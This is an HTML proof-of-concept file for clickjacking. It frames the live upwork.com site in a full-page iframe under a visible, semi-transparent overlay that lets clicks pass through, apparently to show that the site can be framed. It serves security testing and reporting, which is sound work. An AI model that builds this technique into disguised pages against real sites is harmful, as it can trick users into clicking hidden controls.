<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking PoC</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        
        #target {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 0, 0, 0.3);
            /* Semi-transparent overlay */
            pointer-events: none;
            /* Allows clicks to pass through */
        }
    </style>
</head>

<body>
    <iframe id="target" src="https://www.upwork.com"></iframe>
    <div id="overlay"></div>
</body>

</html>
